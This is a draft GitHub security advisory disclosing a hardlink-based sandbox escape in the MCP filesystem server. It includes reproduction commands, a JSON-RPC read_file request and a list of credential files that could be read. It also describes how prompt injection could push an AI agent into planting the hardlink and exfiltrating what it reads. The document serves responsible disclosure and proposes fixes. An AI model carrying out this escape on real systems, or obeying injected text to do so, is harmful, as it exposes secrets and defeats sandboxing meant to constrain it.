# GitHub Security Advisory Draft

> **File this at:** https://github.com/modelcontextprotocol/servers/security/advisories/new
>
> Copy each section below into the corresponding field in the GitHub form.

---

## Advisory Title

Sandbox escape via hardlink allows reading files outside allowed directories

## Affected Product

**Package:** `@modelcontextprotocol/server-filesystem`
**Ecosystem:** npm
**Affected versions:** `<= 2026.1.14` (all published versions: 0.2.0 through 2026.1.14)
**Patched versions:** *(none yet)*

## Severity

**CVSS 3.1 Score:** 7.1 (High)
**Vector:** `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`

## CWE

CWE-59: Improper Link Resolution Before File Access

## Summary

The `validatePath` function in `@modelcontextprotocol/server-filesystem` uses
`path.resolve()` and `fs.realpath()` to verify that requested file paths fall
within the allowed directories. This guards against symlink-based escapes
(CVE-2025-53109) and prefix-collision attacks (CVE-2025-53110), but does not
detect **POSIX hardlinks**.

A hardlink is a second directory entry that points directly to the same inode
(on-disk data) as an existing file. Unlike a symlink, a hardlink has no
indirection — `fs.realpath()` resolves symlink arrows, but hardlinks have no
arrow to follow. When `realpath()` is called on a hardlink inside the sandbox,
it returns the sandbox path unchanged, and the `startsWith` check passes. The
OS then opens the inode, which contains data from the file outside the sandbox.

An attacker who can write files inside the allowed directory (via another MCP
tool, an agent-driven workflow, or any file-creation primitive) can create a
hardlink to any file on the same filesystem, then call `read_file` to read its
contents — bypassing the sandbox entirely.

## Steps to Reproduce

### Prerequisites

- Node.js installed
- `@modelcontextprotocol/server-filesystem@2026.1.14` (or any version)
- A POSIX filesystem (Linux, macOS, WSL) where `/tmp` is a single mount

### Reproduction

```bash
# 1. Set up directories
mkdir -p /tmp/sandbox /tmp/victim
echo "SENSITIVE_DATA_OUTSIDE_SANDBOX" > /tmp/victim/secret.txt

# 2. Start the MCP server with /tmp/sandbox as the allowed directory
node /path/to/server-filesystem/dist/index.js /tmp/sandbox

# 3. Create a hardlink INSIDE the sandbox pointing to the victim file
ln /tmp/victim/secret.txt /tmp/sandbox/innocent.txt
# Note: ln (without -s) creates a hardlink, not a symlink.
# This works because both paths are on the same filesystem.

# 4. Call read_file via MCP JSON-RPC
# Request:
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "read_file",
    "arguments": {"path": "/tmp/sandbox/innocent.txt"}
  }
}

# 5. Response contains the victim file content:
{
  "result": {
    "content": [{"type": "text", "text": "SENSITIVE_DATA_OUTSIDE_SANDBOX\n"}]
  }
}
```

### Why the path validation fails to catch this

```
validatePath("/tmp/sandbox/innocent.txt")
  → path.resolve(...)        = "/tmp/sandbox/innocent.txt"   ✓ inside sandbox
  → fs.realpath(...)         = "/tmp/sandbox/innocent.txt"   ✓ no symlink to follow
  → isPathWithinAllowed(...) = true                          ✓ startsWith passes
  → return realPath (sandbox path)

But at the kernel level:
  /tmp/sandbox/innocent.txt  ──┐
                                ├── inode 12345 (data: "SENSITIVE_DATA...")
  /tmp/victim/secret.txt     ──┘
```

The validation checks the **path string**, but the OS reads the **inode**.
Hardlinks decouple path from inode — two valid paths, one data block.

## Impact

An attacker with write access to the sandbox directory can read the contents
of **any file on the same filesystem** that the Node.js process has read
permission for. This includes:

- `/etc/passwd`, `/etc/shadow` (if running as root)
- SSH keys (`~/.ssh/id_rsa`)
- Application secrets, database credentials
- Other users' files on the same partition

The attack requires only the `read_file` tool and the ability to create files
in the sandbox (via `write_file`, another MCP tool, or an agent workflow).

### Attack scenario in practice

In a typical MCP deployment, an AI agent has access to multiple tools. A
malicious prompt injection or compromised tool description could instruct the
agent to:

1. Use `write_file` or `create_directory` to plant a hardlink
2. Use `read_file` to exfiltrate the target file's contents
3. Use any network-capable tool to send the data externally

Because `read_file` returns the content without error, the agent sees no
security warning and treats the data as normal sandbox content.

## Suggested Fix

Add a hardlink check after path validation, before reading file content:

```javascript
const stats = await fs.lstat(validatedPath);
if (stats.nlink > 1) {
  throw new Error(
    `Access denied - file has multiple hard links (nlink=${stats.nlink}), ` +
    `which may indicate a hardlink escape: ${validatedPath}`
  );
}
```

`fs.lstat()` returns the `nlink` field (number of directory entries pointing to
the same inode). A regular file that has not been hardlinked has `nlink === 1`.
If `nlink > 1`, the file has additional directory entries — potentially outside
the sandbox.

### Alternative mitigations

- **Device+inode tracking:** On startup, record the device+inode of each
  allowed directory's mount point. Before reading, verify the target file's
  inode is on the same device as the sandbox root and was created after the
  server started.
- **Separate mount namespace:** Run the server in a mount namespace where the
  sandbox is on its own tmpfs. Hardlinks cannot cross filesystem boundaries.
- **`O_NOFOLLOW` + inode check:** Open with `O_NOFOLLOW`, then `fstat()` to
  confirm `nlink === 1` before reading.

## Comparison with Existing CVEs

| CVE | Vector | Fixed in | This finding |
|-----|--------|----------|-------------|
| CVE-2025-53109 | Symlink escape | v2025.7.29 | Different — symlinks have a target path that `realpath()` can resolve. Hardlinks do not. |
| CVE-2025-53110 | Prefix string collision (`/allowed_evil`) | v2025.7.29 | Different — prefix attack is a string-matching bug. Hardlink attack is an inode-aliasing bug. |
| **(this)** | Hardlink inode aliasing | **unfixed** | `realpath()` is structurally blind to hardlinks. The fix for CVE-2025-53109 introduced `realpath()` checking, which inadvertently left this class of escape completely unaddressed. |

## Credit

Discovered by [YOUR NAME / HANDLE] during white-hat security research on MCP
server implementations, April 2026.

## Timeline

- **2026-04-12:** Vulnerability discovered and confirmed on v2025.3.28,
  v2025.7.29, and v2026.1.14 (latest)
- **2026-04-12:** Prior art search confirms no existing public disclosure
- **2026-04-12:** Private advisory filed (this report)

---

> **Reminder:** Do NOT publish this publicly until the maintainers have had
> reasonable time to release a fix (typically 90 days). Replace `[YOUR NAME]`
> with your actual name/handle before submitting.
